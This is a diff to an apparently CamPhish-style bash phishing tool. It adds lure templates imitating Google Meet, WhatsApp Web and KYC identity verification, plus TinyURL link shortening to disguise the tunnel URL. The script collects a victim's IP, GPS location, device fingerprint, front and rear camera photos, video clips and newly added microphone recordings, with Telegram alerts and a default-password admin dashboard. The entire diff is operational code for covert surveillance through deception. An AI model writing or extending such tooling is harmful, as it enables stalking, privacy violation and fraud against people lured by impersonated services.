@@ -118,50 +118,39 @@ exit 1
 }
 
 catch_ip() {
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
-cat ip.txt >> saved.ip.txt
+  ip_file=$(ls logs/ip/ip_*.txt 2>/dev/null | tail -1)
+  if [[ -n "$ip_file" ]]; then
+    ip=$(grep -a 'IP:' "$ip_file" | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+  fi
 }
 
 catch_location() {
-  # First check for the current_location.txt file which is always created
-  if [[ -e "current_location.txt" ]]; then
+  # First check for the current_location.txt file in logs/location/
+  if [[ -e "logs/location/current_location.txt" ]]; then
     printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
-    # Filter out unwanted messages before displaying
-    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
+    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" logs/location/current_location.txt
     printf "\n"
-    
-    # Move it to a backup to avoid duplicate display
-    mv current_location.txt current_location.bak
+    mv logs/location/current_location.txt logs/location/current_location.bak
   fi
 
-  # Then check for any location_* files
-  if [[ -e "location_"* ]]; then
-    location_file=$(ls location_* | head -n 1)
+  # Then check for any location_* files in logs/location/
+  if ls logs/location/location_*.txt > /dev/null 2>&1; then
+    location_file=$(ls logs/location/location_*.txt | head -n 1)
     lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
-    
-    # Only display essential location data
+
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
-    
-    # Create directory for saved locations if it doesn't exist
-    if [[ ! -d "saved_locations" ]]; then
-      mkdir -p saved_locations
-    fi
-    
-    mv "$location_file" saved_locations/
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
+
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to logs/location/\e[0m\n"
   else
     printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
-    
-    # Don't display any debug logs to avoid showing unwanted messages
   fi
 }
 
@@ -176,34 +165,39 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is    \e[0m\
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Device fingerprinting is    \e[0m\e[1;93mACTIVE\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera burst (front+rear) is \e[0m\e[1;93mACTIVE\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Video clip capture is       \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Microphone recording is     \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Telegram alerts are         \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Admin Dashboard:  \e[0m\e[1;77m http://127.0.0.1:3333/admin.php\e[0m (pw: admin)\n"
 while [ true ]; do
 
-if [[ -e "ip.txt" ]]; then
+# ── IP detection (logs/ip/) ────────────────────────────────────────────────
+if [[ -e "logs/ip/ip.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
-rm -rf ip.txt
+rm -rf logs/ip/ip.log
 fi
 
 sleep 0.5
 
-if [[ -e "current_location.txt" ]]; then
+# ── Location detection (logs/location/) ───────────────────────────────────
+if [[ -e "logs/location/current_location.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 catch_location
 fi
 
-if [[ -e "LocationLog.log" ]]; then
+if [[ -e "logs/location/LocationLog.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 catch_location
-rm -rf LocationLog.log
+rm -rf logs/location/LocationLog.log
 fi
 
-if [[ -e "LocationError.log" ]]; then
-rm -rf LocationError.log
+if [[ -e "logs/location/LocationError.log" ]]; then
+rm -rf logs/location/LocationError.log
 fi
 
-# Device fingerprint display
-if [[ -e "DeviceInfo.log" ]]; then
-  device_file=$(ls device_*.txt 2>/dev/null | tail -1)
+# ── Device fingerprint (logs/device/) ─────────────────────────────────────
+if [[ -e "logs/device/DeviceInfo.log" ]]; then
+  device_file=$(ls logs/device/device_*.txt 2>/dev/null | tail -1)
   if [[ -n "$device_file" ]]; then
     printf "\n\e[1;92m[\e[0m+\e[1;92m] \e[0m\e[1;93mDevice fingerprint received!\e[0m\n"
     printf "\e[1;92m[------------ Device Info ------------]\e[0m\n"
@@ -213,13 +207,13 @@ if [[ -e "DeviceInfo.log" ]]; then
     done < "$device_file"
     printf "\e[1;92m[-------------------------------------]\e[0m\n"
   fi
-  rm -rf DeviceInfo.log
+  rm -rf logs/device/DeviceInfo.log
 fi
 
-# Cam burst & video clip counts
-if [[ -e "Log.log" ]]; then
+# ── Camera snapshots/video (logs/snapshots/) ───────────────────────────────
+if [[ -e "logs/Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam files received!\e[0m\n"
-snap_dir="snapshots"
+snap_dir="logs/snapshots"
 if [[ -d "$snap_dir" ]]; then
   front_n=$(ls "$snap_dir"/cam_front_*.jpg 2>/dev/null | wc -l | tr -d ' ')
   rear_n=$(ls "$snap_dir"/cam_rear_*.jpg 2>/dev/null | wc -l | tr -d ' ')
@@ -227,14 +221,23 @@ if [[ -d "$snap_dir" ]]; then
   printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Front cam burst  : %s photos\e[0m\n" "$front_n"
   printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Rear cam burst   : %s photos\e[0m\n" "$rear_n"
   printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Video clips      : %s clips\e[0m\n" "$vid_n"
-  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Saved in         : snapshots/\e[0m\n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Saved in         : logs/snapshots/\e[0m\n"
 fi
-rm -rf Log.log
+rm -rf logs/Log.log
+fi
+
+# ── Audio recording (logs/audio/) ─────────────────────────────────────────
+if [[ -e "logs/AudioLog.log" ]]; then
+  audio_dir="logs/audio"
+  audio_n=$(ls "$audio_dir"/mic_*.webm 2>/dev/null | wc -l | tr -d ' ')
+  printf "\n\e[1;92m[\e[0m+\e[1;92m] \e[0m\e[1;93mMicrophone recording received! ($audio_n clips total)\e[0m\n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Saved in: logs/audio/\e[0m\n"
+  rm -rf logs/AudioLog.log
 fi
 
 sleep 0.5
 
-done 
+done
 }
 
 cloudflare_tunnel() {
@@ -424,6 +427,11 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudfla
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+# Shorten URL via TinyURL
+short_link=$(curl -s "https://tinyurl.com/api-create.php?url=${link}" 2>/dev/null)
+if [[ "$short_link" == https://* ]]; then
+  printf "\e[1;92m[\e[0m*\e[1;92m] Short link:  \e[0m\e[1;93m %s\e[0m\n" "$short_link"
+fi
 generate_qr "$link"
 fi
 payload_cloudflare
@@ -438,13 +446,19 @@ else
 fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' templates/festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'$link'+g' templates/LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/GoogleMeet.html > index2.html
+elif [[ $option_tem -eq 5 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/WhatsAppWeb.html > index2.html
+elif [[ $option_tem -eq 6 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/KYCVerify.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' templates/OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
@@ -595,13 +609,19 @@ payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' templates/festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'$link'+g' templates/LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/GoogleMeet.html > index2.html
+elif [[ $option_tem -eq 5 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/WhatsAppWeb.html > index2.html
+elif [[ $option_tem -eq 6 ]]; then
+sed 's+forwarding_link+'$link'+g' templates/KYCVerify.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' templates/OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
@@ -642,16 +662,19 @@ else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting (Zoom)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp Web\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m KYC Identity Verification\e[0m\n"
+default_option_template="3"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 3] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-elif [[ $option_tem -eq 3 ]]; then
+elif [[ $option_tem -ge 3 ]] && [[ $option_tem -le 6 ]]; then
 printf ""
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
